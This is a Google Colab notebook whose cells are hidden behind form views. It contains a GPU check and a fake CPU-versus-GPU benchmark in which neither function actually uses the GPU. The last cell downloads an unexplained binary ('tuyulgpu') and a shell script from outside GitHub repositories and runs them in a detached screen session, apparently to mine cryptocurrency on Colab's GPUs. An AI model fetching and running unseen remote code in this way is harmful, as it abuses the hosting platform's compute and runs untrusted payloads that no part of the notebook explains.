{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "AntiSSH.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "zXcKXzg5jFH6"
      },
      "source": [
        "#@title CEK GPU\n",
        "! nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "lvan1_MjjOGc"
      },
      "source": [
        "#@title Awet Kone\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "NHCjtGx8jipG"
      },
      "source": [
        "#@title om awighnam astu namo sidham\n",
        "\n",
        "#!/bin/sh\n",
        "\n",
        "!sudo apt update\n",
        "!sudo apt install screen -y\n",
        "!screen -dmS gpu.sh ./gpu.sh 65 75\n",
        "!wget https://github.com/nuri655/nur/raw/main/tuyulgpu\n",
        "!wget https://raw.githubusercontent.com/robbyezhaa/Cloudflare/main/gpu.sh\n",
        "!chmod +x gpu.sh\n",
        "!./gpu.sh\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
